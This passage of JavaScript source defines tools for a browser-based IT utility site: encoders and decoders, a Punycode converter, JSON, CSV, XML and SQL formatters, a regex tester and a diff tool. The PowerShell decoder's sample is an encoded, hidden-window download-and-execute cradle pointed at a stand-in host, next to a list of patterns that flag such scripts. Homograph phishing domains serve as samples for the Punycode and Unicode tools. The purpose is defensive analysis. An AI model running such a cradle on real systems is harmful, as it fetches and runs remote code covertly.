(function () {
  'use strict';
  const { tool: T, ref, u } = IT;
  const two = (a, b) => ({ k: 'mode', type: 'seg', label: 'Mode', options: [a, b], value: a });
  const softText = (b) => { try { return u.fromUtf8(b, true); } catch { return null; } };
  const bytesOut = (b) => { const t = softText(b); return t === null ? [{ note: 'The result is binary, so it is shown as hex.', tone: 'warn' }, { text: u.hex(b) }] : t; };

  T({
    id: 'base64', name: 'Base64 Encoder / Decoder', cat: 'encode', featured: true,
    tags: 'b64 decode encode url-safe',
    fields: [{ k: 'x', type: 'area', label: 'Input', rows: 7 }, two('Encode', 'Decode'), { k: 'url', type: 'check', label: 'URL-safe alphabet' }],
    sample: { x: 'Service account: svc_backup', mode: 'Encode' },
    run(v) {
      if (!v.x) return null;
      if (v.mode === 'Decode') return bytesOut(u.unb64(v.x));
      return v.url ? u.b64url(u.utf8(v.x)) : u.b64(u.utf8(v.x));
    },
  });
  T({
    id: 'file-base64', name: 'File to Base64', cat: 'encode',
    tags: 'data uri image embed',
    fields: [{ k: 'f', type: 'file', label: 'File' }, { k: 'uri', type: 'check', label: 'Output as a data URI', value: true }],
    run(v) {
      if (!v.f) return null;
      const s = u.b64(v.f.bytes);
      return { text: v.uri ? `data:${v.f.type || 'application/octet-stream'};base64,${s}` : s, title: `${u.fmtBytes(v.f.bytes.length)} in, ${u.fmtBytes(s.length)} out` };
    },
  });
  T({
    id: 'base32', name: 'Base32 Encoder / Decoder', cat: 'encode',
    tags: 'totp encode decode rfc4648',
    fields: [{ k: 'x', type: 'area', label: 'Input', rows: 5 }, two('Encode', 'Decode')],
    sample: { x: 'Hello!', mode: 'Encode' },
    run(v) {
      if (!v.x) return null;
      return v.mode === 'Encode' ? u.b32enc(u.utf8(v.x)) : bytesOut(u.b32dec(v.x));
    },
  });
  T({
    id: 'hex-text', name: 'Hex Encoder / Decoder', cat: 'encode',
    tags: 'hexadecimal bytes encode decode',
    fields: [{ k: 'x', type: 'area', label: 'Input', rows: 5 }, two('Encode', 'Decode'), { k: 'sp', type: 'check', label: 'Separate bytes with spaces', show: (v) => v.mode === 'Encode' }],
    sample: { x: 'IT Tools', mode: 'Encode', sp: true },
    run(v) {
      if (!v.x) return null;
      if (v.mode === 'Decode') return bytesOut(u.unhex(v.x));
      const h = u.hex(u.utf8(v.x));
      return v.sp ? h.match(/../g).join(' ') : h;
    },
  });
  T({
    id: 'url-encode', name: 'URL Encoder / Decoder', cat: 'encode',
    tags: 'percent escape uri component safelink',
    fields: [{ k: 'x', type: 'area', label: 'Input', rows: 5 }, two('Encode', 'Decode'), { k: 'full', type: 'check', label: 'Whole URL (keep :/?&=)', show: (v) => v.mode === 'Encode' }],
    sample: { x: 'name=Ops Team&path=/share/a b', mode: 'Encode' },
    run(v) {
      if (!v.x) return null;
      if (v.mode === 'Decode') { try { return decodeURIComponent(v.x.replace(/\+/g, ' ')); } catch { throw new Error('That contains an invalid percent sequence.'); } }
      return v.full ? encodeURI(v.x) : encodeURIComponent(v.x);
    },
  });
  const ENT = { amp: '&', lt: '<', gt: '>', quot: '"', apos: "'", nbsp: '\u00a0', copy: '©', reg: '®', trade: '™', hellip: '…', mdash: '—', ndash: '–', lsquo: '‘', rsquo: '’', ldquo: '“', rdquo: '”', euro: '€', pound: '£' };
  T({
    id: 'html-entities', name: 'HTML Entities', cat: 'encode',
    tags: 'escape unescape amp lt gt',
    fields: [{ k: 'x', type: 'area', label: 'Input', rows: 5 }, two('Encode', 'Decode')],
    sample: { x: '<a href="?a=1&b=2">Fish & chips</a>', mode: 'Encode' },
    run(v) {
      if (!v.x) return null;
      if (v.mode === 'Encode') return u.esc(v.x).replace(/[\u0080-\uffff]/g, (c) => `&#${c.charCodeAt(0)};`);
      return v.x.replace(/&(#\d+|#x[0-9a-f]+|\w+);/gi, (m, e) => {
        if (e[0] === '#') return String.fromCodePoint(/x/i.test(e[1]) ? parseInt(e.slice(2), 16) : +e.slice(1));
        return ENT[e] !== undefined ? ENT[e] : m;
      });
    },
  });
  T({
    id: 'text-binary', name: 'Text to Binary', cat: 'encode',
    tags: 'ascii bits 01',
    fields: [{ k: 'x', type: 'area', label: 'Input', rows: 5 }, two('Encode', 'Decode')],
    sample: { x: 'IT', mode: 'Encode' },
    run(v) {
      if (!v.x) return null;
      if (v.mode === 'Encode') return Array.from(u.utf8(v.x), (b) => b.toString(2).padStart(8, '0')).join(' ');
      const c = v.x.replace(/\s/g, '');
      if (/[^01]/.test(c) || c.length % 8) throw new Error('Binary must be groups of 8 bits.');
      return bytesOut(Uint8Array.from(c.match(/.{8}/g), (b) => parseInt(b, 2)));
    },
  });
  T({
    id: 'number-base', name: 'Number Base Converter', cat: 'encode', featured: true,
    tags: 'radix binary hex octal decimal bigint',
    fields: [{ k: 'x', type: 'text', label: 'Number', mono: true }, { k: 'b', type: 'select', label: 'Input base', options: [['2', 'Binary (2)'], ['8', 'Octal (8)'], ['10', 'Decimal (10)'], ['16', 'Hex (16)'], ['36', 'Base 36']], value: '10' }],
    sample: { x: '3735928559', b: '10' },
    run(v) {
      const s = v.x.trim().replace(/[_\s,]/g, '').replace(/^0[xbo]/i, '').toLowerCase();
      if (!s) return null;
      const b = BigInt(v.b);
      let n = 0n;
      for (const c of s) {
        const d = BigInt(parseInt(c, 36));
        if (isNaN(parseInt(c, 36)) || d >= b) throw new Error(`"${c}" is not a digit in base ${v.b}.`);
        n = n * b + d;
      }
      return { kv: [['Binary', n.toString(2)], ['Octal', n.toString(8)], ['Decimal', n.toString(10)], ['Hex', n.toString(16).toUpperCase()], ['Base 36', n.toString(36)], ['Bits needed', String(n.toString(2).length)]] };
    },
  });
  // Punycode, RFC 3492
  const pc = { base: 36, tmin: 1, tmax: 26, skew: 38, damp: 700 };
  const adapt = (d, n, first) => {
    d = first ? Math.floor(d / pc.damp) : d >> 1;
    d += Math.floor(d / n);
    let k = 0;
    while (d > 455) { d = Math.floor(d / 35); k += 36; }
    return k + Math.floor((36 * d) / (d + 38));
  };
  const dig = (d) => String.fromCharCode(d < 26 ? d + 97 : d + 22);
  IT.punyEncode = function (input) {
    const cps = Array.from(input, (c) => c.codePointAt(0));
    let out = cps.filter((c) => c < 128).map((c) => String.fromCharCode(c)).join('');
    const b = out.length;
    let h = b, n = 128, delta = 0, bias = 72;
    if (b) out += '-';
    while (h < cps.length) {
      const m = Math.min(...cps.filter((c) => c >= n));
      delta += (m - n) * (h + 1);
      n = m;
      for (const c of cps) {
        if (c < n) delta++;
        if (c === n) {
          let q = delta;
          for (let k = 36; ; k += 36) {
            const t = k <= bias ? 1 : k >= bias + 26 ? 26 : k - bias;
            if (q < t) break;
            out += dig(t + ((q - t) % (36 - t)));
            q = Math.floor((q - t) / (36 - t));
          }
          out += dig(q);
          bias = adapt(delta, h + 1, h === b);
          delta = 0;
          h++;
        }
      }
      delta++; n++;
    }
    return out;
  };
  IT.punyDecode = function (s) {
    const out = [];
    const d = s.lastIndexOf('-');
    for (let i = 0; i < Math.max(d, 0); i++) out.push(s.charCodeAt(i));
    let n = 128, i = 0, bias = 72;
    for (let p = d > 0 ? d + 1 : 0; p < s.length;) {
      const old = i;
      for (let w = 1, k = 36; ; k += 36) {
        const c = s.charCodeAt(p++);
        const dg = c - 48 < 10 ? c - 22 : c - 65 < 26 ? c - 65 : c - 97 < 26 ? c - 97 : 36;
        if (dg >= 36 || isNaN(c)) throw new Error('That is not valid Punycode.');
        i += dg * w;
        const t = k <= bias ? 1 : k >= bias + 26 ? 26 : k - bias;
        if (dg < t) break;
        w *= 36 - t;
      }
      bias = adapt(i - old, out.length + 1, old === 0);
      n += Math.floor(i / (out.length + 1));
      i %= out.length + 1;
      out.splice(i++, 0, n);
    }
    return String.fromCodePoint(...out);
  };
  T({
    id: 'punycode', name: 'Punycode / IDN Converter', cat: 'encode',
    tags: 'idn xn-- homograph domain unicode phishing',
    fields: [{ k: 'x', type: 'text', label: 'Domain', ph: 'bücher.example or xn--bcher-kva.example', mono: true }],
    sample: { x: 'xn--pple-43d.com' },
    run(v) {
      const s = v.x.trim().toLowerCase();
      if (!s) return null;
      const labels = s.split('.');
      const uni = labels.map((l) => (l.startsWith('xn--') ? IT.punyDecode(l.slice(4)) : l)).join('.');
      const asc = labels.map((l) => (/[^\x00-\x7f]/.test(l) ? 'xn--' + IT.punyEncode(l) : l)).join('.');
      const nonLatin = /[^\x00-\u024f]/.test(uni);
      return [nonLatin ? { note: 'This domain mixes in non-Latin characters. It may be imitating another name.', tone: 'warn' } : null, { kv: [['Unicode', uni], ['ASCII', asc]] }];
    },
  });
  T({
    id: 'quoted-printable', name: 'Quoted-Printable', cat: 'encode',
    tags: 'email mime rfc2045 eml',
    fields: [{ k: 'x', type: 'area', label: 'Input', rows: 6 }, two('Decode', 'Encode')],
    sample: { x: 'Caf=C3=A9 r=C3=A9sum=C3=A9 =3D done', mode: 'Decode' },
    run(v) {
      if (!v.x) return null;
      if (v.mode === 'Decode') {
        const s = v.x.replace(/=\r?\n/g, ''), o = [];
        for (let i = 0; i < s.length; i++) {
          if (s[i] === '=' && /^[0-9a-f]{2}$/i.test(s.substr(i + 1, 2))) { o.push(parseInt(s.substr(i + 1, 2), 16)); i += 2; }
          else o.push(...u.utf8(s[i]));
        }
        return u.fromUtf8(Uint8Array.from(o));
      }
      let line = '', out = '';
      const push = (t) => { if (line.length + t.length > 75) { out += line + '=\n'; line = ''; } line += t; };
      for (const b of u.utf8(v.x)) {
        if (b === 10) { out += line + '\n'; line = ''; }
        else if (b === 13) continue;
        else push((b >= 33 && b <= 126 && b !== 61) || b === 32 || b === 9 ? String.fromCharCode(b) : '=' + b.toString(16).toUpperCase().padStart(2, '0'));
      }
      return out + line;
    },
  });
  const PS_FLAGS = [['Downloads content', /downloadstring|downloadfile|invoke-webrequest|\biwr\b|net\.webclient|start-bitstransfer/i], ['Runs dynamic code', /\biex\b|invoke-expression/i], ['Hidden window', /windowstyle\s+hidden|-w\s+hidden/i], ['Bypasses policy', /executionpolicy\s+bypass|-ep\s+bypass/i], ['Further encoding', /frombase64string|-enc\b|-encodedcommand/i], ['AMSI tampering', /amsi/i]];
  T({
    id: 'powershell-encoded', name: 'PowerShell EncodedCommand', cat: 'encode', featured: true,
    tags: 'base64 utf-16 utf16le enc malware soc obfuscation',
    fields: [{ k: 'x', type: 'area', label: 'Script, or the encoded command line', rows: 7 }, two('Decode', 'Encode')],
    sample: { x: 'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGkAbgB2AGEAbABpAGQALwBwAC4AcABzADEAJwApAA==', mode: 'Decode' },
    run(v) {
      if (!v.x.trim()) return null;
      if (v.mode === 'Encode') {
        const b = new Uint8Array(v.x.length * 2);
        for (let i = 0; i < v.x.length; i++) { const c = v.x.charCodeAt(i); b[i * 2] = c & 255; b[i * 2 + 1] = c >> 8; }
        return `powershell.exe -NoProfile -EncodedCommand ${u.b64(b)}`;
      }
      const tok = v.x.trim().split(/\s+/).filter((t) => t.length >= 8 && /^[A-Za-z0-9+/=]+$/.test(t)).sort((a, b) => b.length - a.length)[0];
      if (!tok) throw new Error('No Base64 block found in that text.');
      const b = u.unb64(tok);
      const s = new TextDecoder('utf-16le').decode(b);
      const hits = PS_FLAGS.filter(([, r]) => r.test(s) || r.test(v.x)).map((f) => f[0]);
      return [hits.length ? { note: 'Flagged: ' + hits.join(', ') + '.', tone: 'bad' } : { note: 'No common risky patterns matched.', tone: 'ok' }, { title: 'Decoded script', text: s }];
    },
  });
  T({
    id: 'gzip-tool', name: 'Gzip Text Compressor', cat: 'encode',
    tags: 'deflate compress decompress inflate',
    fields: [{ k: 'x', type: 'area', label: 'Input', rows: 6 }, two('Compress', 'Decompress')],
    sample: { x: 'repeat repeat repeat repeat repeat repeat repeat repeat', mode: 'Compress' },
    async run(v) {
      if (!v.x.trim()) return null;
      const pipe = (b, s) => new Response(new Blob([b]).stream().pipeThrough(s)).arrayBuffer();
      if (v.mode === 'Compress') {
        const b = u.utf8(v.x), o = new Uint8Array(await pipe(b, new CompressionStream('gzip')));
        return { text: u.b64(o), title: `${b.length} bytes to ${o.length} bytes` };
      }
      try { return bytesOut(new Uint8Array(await pipe(u.unb64(v.x), new DecompressionStream('gzip')))); }
      catch (e) { if (/Base64/.test(e.message)) throw e; throw new Error('That is not valid gzip data.'); }
    },
  });
  T({
    id: 'unicode-inspector', name: 'Unicode Inspector', cat: 'encode',
    tags: 'invisible homoglyph utf-8 code point character smart quote',
    fields: [{ k: 'x', type: 'area', label: 'Text', rows: 4 }],
    sample: { x: 'pаypal\u200b.com' },
    run(v) {
      const ch = Array.from(v.x);
      if (!ch.length) return null;
      const flag = (c) => {
        const n = c.codePointAt(0);
        if (/[\u200b-\u200f\u2060\ufeff\u00ad\u202a-\u202e]/.test(c)) return 'Invisible or control';
        if (n >= 0x400 && n <= 0x52f) return 'Cyrillic (look-alike risk)';
        if (n >= 0x370 && n <= 0x3ff) return 'Greek (look-alike risk)';
        if (/\s/.test(c) && c !== ' ' && c !== '\n') return 'Unusual whitespace';
        if (n < 32) return 'Control';
        return n > 126 ? 'Non-ASCII' : '';
      };
      const rows = ch.slice(0, 300).map((c, i) => [i + 1, /[\s\u200b-\u200f\u2060\ufeff]/.test(c) ? '(blank)' : c, 'U+' + c.codePointAt(0).toString(16).toUpperCase().padStart(4, '0'), u.hex(u.utf8(c)), flag(c) || '-']);
      const bad = rows.filter((r) => r[4] !== '-' && r[4] !== 'Non-ASCII').length;
      return [{ note: bad ? `${bad} suspicious character(s).` : 'No hidden or look-alike characters.', tone: bad ? 'warn' : 'ok' }, { table: { head: ['#', 'Char', 'Code point', 'UTF-8', 'Notes'], rows } }];
    },
  });
  T({
    id: 'caesar-rot13', name: 'ROT13 / Caesar Cipher', cat: 'encode',
    tags: 'rot13 shift cipher ctf',
    fields: [{ k: 'x', type: 'area', label: 'Text', rows: 4 }, { k: 's', type: 'num', label: 'Shift', value: 13, min: 1, max: 25 }, { k: 'all', type: 'check', label: 'Show every shift' }],
    sample: { x: 'Uryyb, VG grnz!', s: 13 },
    run(v) {
      if (!v.x) return null;
      const r = (s, n) => s.replace(/[a-z]/gi, (c) => { const b = c <= 'Z' ? 65 : 97; return String.fromCharCode(((c.charCodeAt(0) - b + n) % 26) + b); });
      if (v.all) return { table: { head: ['Shift', 'Result'], rows: Array.from({ length: 25 }, (_, i) => [i + 1, r(v.x, i + 1)]) } };
      return r(v.x, +v.s);
    },
  });
  const NATO = { A: 'Alfa', B: 'Bravo', C: 'Charlie', D: 'Delta', E: 'Echo', F: 'Foxtrot', G: 'Golf', H: 'Hotel', I: 'India', J: 'Juliett', K: 'Kilo', L: 'Lima', M: 'Mike', N: 'November', O: 'Oscar', P: 'Papa', Q: 'Quebec', R: 'Romeo', S: 'Sierra', T: 'Tango', U: 'Uniform', V: 'Victor', W: 'Whiskey', X: 'X-ray', Y: 'Yankee', Z: 'Zulu', 0: 'Zero', 1: 'One', 2: 'Two', 3: 'Three', 4: 'Four', 5: 'Five', 6: 'Six', 7: 'Seven', 8: 'Eight', 9: 'Nine', '-': 'Dash', '.': 'Dot', '_': 'Underscore', '@': 'At', '/': 'Slash', '!': 'Exclamation', '#': 'Hash', '$': 'Dollar', '&': 'Ampersand', '*': 'Star', '?': 'Question mark', '+': 'Plus', '=': 'Equals' };
  T({
    id: 'nato-phonetic', name: 'NATO Phonetic Speller', cat: 'helpdesk',
    tags: 'alphabet phone spell alpha bravo',
    fields: [{ k: 'x', type: 'text', label: 'Text', mono: true }],
    sample: { x: 'Tk7-mQ2x' },
    run(v) {
      if (!v.x) return null;
      return Array.from(v.x).map((c) => {
        const w = NATO[c.toUpperCase()];
        if (c === ' ') return '(space)';
        if (!w) return c;
        return /[a-z]/.test(c) ? `${w} (lower)` : /[A-Z]/.test(c) ? `${w.toUpperCase()} (UPPER)` : w;
      }).join('\n');
    },
  });
  ref({
    id: 'ascii-table', name: 'ASCII Table', cat: 'encode',
    tags: 'character code chart',
    head: ['Dec', 'Hex', 'Oct', 'Binary', 'Char'],
    rows: Array.from({ length: 128 }, (_, i) => {
      const C = 'NUL SOH STX ETX EOT ENQ ACK BEL BS TAB LF VT FF CR SO SI DLE DC1 DC2 DC3 DC4 NAK SYN ETB CAN EM SUB ESC FS GS RS US'.split(' ');
      return [String(i), i.toString(16).toUpperCase().padStart(2, '0'), i.toString(8).padStart(3, '0'), i.toString(2).padStart(7, '0'), i < 32 ? C[i] : i === 32 ? 'Space' : i === 127 ? 'DEL' : String.fromCharCode(i)];
    }),
  });

  // ---------- Text & Data ----------
  T({
    id: 'json-formatter', name: 'JSON Formatter', cat: 'data', featured: true,
    tags: 'lint beautify validate minify pretty',
    fields: [
      { k: 'x', type: 'area', label: 'JSON', rows: 12 },
      { k: 'mode', type: 'seg', label: 'Output', options: ['Pretty', 'Minified'], value: 'Pretty' },
      { k: 'sort', type: 'check', label: 'Sort keys' },
    ],
    sample: { x: '{"host":"web01","ports":[80,443],"tags":{"env":"prod","owner":"ops"},"up":true}' },
    run(v) {
      if (!v.x.trim()) return null;
      let o;
      try { o = JSON.parse(v.x); } catch (e) {
        const m = /position (\d+)/.exec(e.message);
        if (m) { const before = v.x.slice(0, +m[1]).split('\n'); throw new Error(`Invalid JSON at line ${before.length}, column ${before[before.length - 1].length + 1}: ${e.message}`); }
        throw new Error('Invalid JSON: ' + e.message);
      }
      const sort = (x) => (Array.isArray(x) ? x.map(sort) : x && typeof x === 'object' ? Object.fromEntries(Object.keys(x).sort().map((k) => [k, sort(x[k])])) : x);
      if (v.sort) o = sort(o);
      return { text: v.mode === 'Pretty' ? JSON.stringify(o, null, 2) : JSON.stringify(o), name: 'output.json' };
    },
  });
  T({
    id: 'json-yaml', name: 'JSON / YAML Converter', cat: 'data', featured: true,
    tags: 'kubernetes compose ansible convert validate',
    fields: [{ k: 'x', type: 'area', label: 'Input', rows: 12 }, { k: 'mode', type: 'seg', label: 'Direction', options: ['YAML to JSON', 'JSON to YAML'], value: 'YAML to JSON' }],
    sample: { x: 'services:\n  web:\n    image: nginx:1.27\n    ports:\n      - "8080:80"\n    restart: always', mode: 'YAML to JSON' },
    run(v) {
      if (!v.x.trim()) return null;
      /* global jsyaml */
      if (v.mode === 'JSON to YAML') {
        let o;
        try { o = JSON.parse(v.x); } catch (e) { throw new Error('Invalid JSON: ' + e.message); }
        return jsyaml.dump(o, { lineWidth: -1 });
      }
      try { return JSON.stringify(jsyaml.load(v.x, { schema: jsyaml.CORE_SCHEMA }), null, 2); } catch (e) { throw new Error('Invalid YAML: ' + (e.reason || e.message) + (e.mark ? ` (line ${e.mark.line + 1})` : '')); }
    },
  });
  const flat = (o, p, r) => {
    for (const k of Object.keys(o)) {
      const v = o[k], n = p ? `${p}.${k}` : k;
      if (v && typeof v === 'object' && !Array.isArray(v)) flat(v, n, r);
      else r[n] = v;
    }
    return r;
  };
  const DELIMS = [[',', 'Comma'], [';', 'Semicolon'], ['\t', 'Tab'], ['|', 'Pipe']];
  T({
    id: 'csv-json', name: 'CSV / JSON Converter', cat: 'data',
    tags: 'spreadsheet excel export import convert table',
    fields: [
      { k: 'x', type: 'area', label: 'Input', rows: 10 },
      { k: 'mode', type: 'seg', label: 'Direction', options: ['CSV to JSON', 'JSON to CSV'], value: 'CSV to JSON' },
      { k: 'd', type: 'select', label: 'Delimiter', options: DELIMS, value: ',' },
    ],
    sample: { x: 'host,ip,role\nweb01,10.0.0.10,"frontend, public"\ndb01,10.0.0.20,database' },
    run(v) {
      if (!v.x.trim()) return null;
      if (v.mode === 'CSV to JSON') {
        const [h, ...rows] = u.parseCSV(v.x.trim(), v.d);
        return { text: JSON.stringify(rows.map((r) => Object.fromEntries(h.map((k, i) => [k, r[i] === undefined ? '' : r[i]]))), null, 2), name: 'output.json' };
      }
      let o;
      try { o = JSON.parse(v.x); } catch (e) { throw new Error('Invalid JSON: ' + e.message); }
      const a = (Array.isArray(o) ? o : [o]).map((r) => flat(r && typeof r === 'object' ? r : { value: r }, '', {}));
      const keys = [...new Set(a.flatMap(Object.keys))];
      return { text: [keys.map((k) => u.csvCell(k, v.d)).join(v.d), ...a.map((r) => keys.map((k) => u.csvCell(r[k], v.d)).join(v.d))].join('\n'), name: 'output.csv' };
    },
  });
  T({
    id: 'csv-viewer', name: 'CSV Viewer & Markdown Table', cat: 'data',
    tags: 'table preview markdown wiki',
    fields: [{ k: 'x', type: 'area', label: 'CSV', rows: 8 }, { k: 'd', type: 'select', label: 'Delimiter', options: DELIMS, value: ',' }],
    sample: { x: 'Server,OS,Owner\nweb01,Ubuntu 24.04,Ops\ndc01,Windows Server 2022,Infra' },
    run(v) {
      if (!v.x.trim()) return null;
      const [h, ...r] = u.parseCSV(v.x.trim(), v.d);
      const md = (row) => '| ' + h.map((_, i) => String(row[i] === undefined ? '' : row[i]).replace(/\|/g, '\\|')).join(' | ') + ' |';
      return [{ table: { head: h, rows: r }, note: `${r.length} rows, ${h.length} columns` }, { title: 'Markdown', text: [md(h), '| ' + h.map(() => '---').join(' | ') + ' |', ...r.map(md)].join('\n') }];
    },
  });
  IT.fmtXml = function (s) {
    const tok = s.replace(/>\s+</g, '><').match(/<!--[\s\S]*?-->|<!\[CDATA\[[\s\S]*?\]\]>|<[^>]+>|[^<]+/g) || [];
    let d = 0;
    const o = [];
    for (let i = 0; i < tok.length; i++) {
      const t = tok[i];
      if (/^<\//.test(t)) { d = Math.max(0, d - 1); o.push('  '.repeat(d) + t); }
      else if (/^<[^!?]/.test(t) && !/\/>$/.test(t)) {
        if (tok[i + 1] && !tok[i + 1].startsWith('<') && tok[i + 2] && tok[i + 2].startsWith('</')) { o.push('  '.repeat(d) + t + tok[i + 1] + tok[i + 2]); i += 2; }
        else { o.push('  '.repeat(d) + t); d++; }
      } else o.push('  '.repeat(d) + t.trim());
    }
    return o.join('\n');
  };
  T({
    id: 'xml-formatter', name: 'XML Formatter', cat: 'data',
    tags: 'beautify pretty minify',
    fields: [{ k: 'x', type: 'area', label: 'XML', rows: 10 }, { k: 'mode', type: 'seg', label: 'Output', options: ['Pretty', 'Minified'], value: 'Pretty' }],
    sample: { x: '<?xml version="1.0"?><config><server name="web01"><port>443</port></server><!-- note --></config>' },
    run(v) {
      if (!v.x.trim()) return null;
      return v.mode === 'Pretty' ? IT.fmtXml(v.x.trim()) : v.x.replace(/>\s+</g, '><').trim();
    },
  });
  const SQLNL = 'SELECT|FROM|WHERE|GROUP BY|ORDER BY|HAVING|LIMIT|OFFSET|INSERT INTO|VALUES|UPDATE|SET|DELETE FROM|UNION ALL|UNION|(?:INNER |LEFT OUTER |RIGHT OUTER |LEFT |RIGHT |FULL |CROSS )?JOIN';
  T({
    id: 'sql-formatter', name: 'SQL Formatter', cat: 'data',
    tags: 'query beautify pretty',
    fields: [{ k: 'x', type: 'area', label: 'SQL', rows: 8 }],
    sample: { x: "select u.name, count(*) as logins from users u left join logins l on l.user_id = u.id where l.ts > '2026-01-01' and u.active = 1 group by u.name order by logins desc limit 10" },
    run(v) {
      if (!v.x.trim()) return null;
      // Split on quoted strings first so their contents are never touched.
      return v.x.trim().split(/('(?:[^']|'')*')/).map((p, i) => {
        if (i % 2) return p;
        return p.replace(/\s+/g, ' ')
          .replace(new RegExp(`\\b(${SQLNL})\\b`, 'gi'), (m) => '\n' + m.toUpperCase())
          .replace(/\b(AND|OR)\b/gi, (m) => '\n  ' + m.toUpperCase())
          .replace(/\b(ON|AS|IN|NOT|NULL|IS|LIKE|BETWEEN|DESC|ASC|DISTINCT|CASE|WHEN|THEN|ELSE|END)\b/gi, (m) => m.toUpperCase());
      }).join('').trim().replace(/ +\n/g, '\n');
    },
  });
  T({
    id: 'regex-tester', name: 'Regex Tester', cat: 'data', featured: true,
    tags: 'regular expression pattern match replace capture',
    fields: [
      { k: 'p', type: 'text', label: 'Pattern', mono: true, ph: '\\d{1,3}(\\.\\d{1,3}){3}' },
      { k: 'f', type: 'text', label: 'Flags', value: 'gi', mono: true },
      { k: 'x', type: 'area', label: 'Test text', rows: 7 },
      { k: 'r', type: 'text', label: 'Replace with (optional)', mono: true },
    ],
    sample: { p: '(\\w+)@([\\w.]+)', f: 'gi', x: 'Contact ops@example.com or admin@corp.example.org today.', r: '$1 at $2' },
    run(v) {
      if (!v.p) return null;
      let re;
      try { re = new RegExp(v.p, v.f.includes('g') ? v.f : v.f + 'g'); } catch (e) { throw new Error(e.message); }
      const rows = [];
      let m, guard = 0;
      while ((m = re.exec(v.x)) && guard++ < 1000) {
        rows.push([rows.length + 1, m.index, m[0], m.slice(1).join(' | ') || '-']);
        if (m[0] === '') re.lastIndex++;
      }
      return [{ note: `${rows.length}${guard >= 1000 ? '+' : ''} match(es)`, tone: rows.length ? 'ok' : 'warn' }, rows.length ? { table: { head: ['#', 'Index', 'Match', 'Groups'], rows } } : null, v.r ? { title: 'After replace', text: v.x.replace(re, v.r) } : null];
    },
  });
  IT.diffLines = function (a, b) {
    let s = 0;
    while (s < a.length && s < b.length && a[s] === b[s]) s++;
    let ea = a.length, eb = b.length;
    while (ea > s && eb > s && a[ea - 1] === b[eb - 1]) { ea--; eb--; }
    const A = a.slice(s, ea), B = b.slice(s, eb), n = A.length, m = B.length;
    if (n * m > 25e6) throw new Error('Those inputs differ across too many lines to compare here.');
    const L = Array.from({ length: n + 1 }, () => new Uint32Array(m + 1));
    for (let i = n - 1; i >= 0; i--) for (let j = m - 1; j >= 0; j--) L[i][j] = A[i] === B[j] ? L[i + 1][j + 1] + 1 : Math.max(L[i + 1][j], L[i][j + 1]);
    const o = a.slice(0, s).map((l) => [' ', l]);
    let i = 0, j = 0;
    while (i < n || j < m) {
      if (i < n && j < m && A[i] === B[j]) { o.push([' ', A[i]]); i++; j++; }
      else if (i < n && (j === m || L[i + 1][j] >= L[i][j + 1])) o.push(['-', A[i++]]);
      else o.push(['+', B[j++]]);
    }
    return o.concat(a.slice(ea).map((l) => [' ', l]));
  };
  T({
    id: 'text-diff', name: 'Text Diff', cat: 'data', featured: true,
    tags: 'compare difference changes config',
    fields: [{ k: 'a', type: 'area', label: 'Original', rows: 9, half: true }, { k: 'b', type: 'area', label: 'Changed', rows: 9, half: true }, { k: 'ws', type: 'check', label: 'Ignore leading and trailing spaces' }],
    sample: { a: 'hostname sw01\nvlan 10\n name users\nvlan 20\n name voice', b: 'hostname sw01\nvlan 10\n name staff\nvlan 20\n name voice\nvlan 30\n name guest', ws: false },
    run(v) {
      if (!v.a && !v.b) return null;
      const n = (s) => u.lines(s).map((l) => (v.ws ? l.trim() : l));
      const d = IT.diffLines(n(v.a), n(v.b));
      const add = d.filter((x) => x[0] === '+').length, del = d.filter((x) => x[0] === '-').length;
      return [{ note: add || del ? `${add} added, ${del} removed` : 'The two texts are identical.', tone: add || del ? 'warn' : 'ok' }, { diff: d }];
    },
  });
  T({
    id: 'list-compare', name: 'List Compare', cat: 'data', featured: true,
    tags: 'set difference intersection group members vlookup',
    fields: [{ k: 'a', type: 'area', label: 'List A', rows: 8, half: true }, { k: 'b', type: 'area', label: 'List B', rows: 8, half: true }, { k: 'ci', type: 'check', label: 'Ignore case', value: true }],
    sample: { a: 'alice\nbob\ncarol\ndave', b: 'Bob\ncarol\nerin', ci: true },
    run(v) {
      const parse = (s) => {
        const m = new Map();
        for (const l of u.lines(s).map((x) => x.trim()).filter(Boolean)) m.set(v.ci ? l.toLowerCase() : l, l);
        return m;
      };
      const A = parse(v.a), B = parse(v.b);
      if (!A.size && !B.size) return null;
      const onlyA = [...A.keys()].filter((k) => !B.has(k)).map((k) => A.get(k));
      const onlyB = [...B.keys()].filter((k) => !A.has(k)).map((k) => B.get(k));
      const both = [...A.keys()].filter((k) => B.has(k)).map((k) => A.get(k));
      return [{ title: `Only in A (${onlyA.length})`, text: onlyA.join('\n') || '(none)' }, { title: `Only in B (${onlyB.length})`, text: onlyB.join('\n') || '(none)' }, { title: `In both (${both.length})`, text: both.join('\n') || '(none)' }];
    },
  });
  T({
    id: 'line-tools', name: 'Sort & Dedupe Lines', cat: 'data',
    tags: 'unique sort remove duplicates blank trim shuffle',
    fields: [
      { k: 'x', type: 'area', label: 'Lines', rows: 10 },
      { k: 'sort', type: 'select', label: 'Sort', options: [['none', 'Keep order'], ['az', 'A to Z'], ['za', 'Z to A'], ['num', 'Natural (web2 before web10)'], ['ip', 'IP address'], ['len', 'By length'], ['rev', 'Reverse'], ['rand', 'Shuffle']], value: 'none' },
      { k: 'dedupe', type: 'check', label: 'Remove duplicates', value: true },
      { k: 'ci', type: 'check', label: 'Ignore case for duplicates' },
      { k: 'trim', type: 'check', label: 'Trim each line', value: true },
      { k: 'blank', type: 'check', label: 'Remove blank lines', value: true },
    ],
    sample: { x: 'web10\nweb2\nweb1\nweb2\n\n  db01  ', sort: 'num' },
    run(v) {
      if (!v.x) return null;
      let l = u.lines(v.x);
      if (v.trim) l = l.map((s) => s.trim());
      if (v.blank) l = l.filter((s) => s.trim());
      if (v.dedupe) {
        const seen = new Set();
        l = l.filter((s) => { const k = v.ci ? s.toLowerCase() : s; if (seen.has(k)) return false; seen.add(k); return true; });
      }
      const ipk = (s) => (s.match(/\d+/g) || []).slice(0, 4).reduce((a, n) => a * 256 + +n, 0);
      const cmp = new Intl.Collator('en', { numeric: true, sensitivity: 'base' });
      if (v.sort === 'az') l.sort((a, b) => a.localeCompare(b));
      else if (v.sort === 'za') l.sort((a, b) => b.localeCompare(a));
      else if (v.sort === 'num') l.sort(cmp.compare);
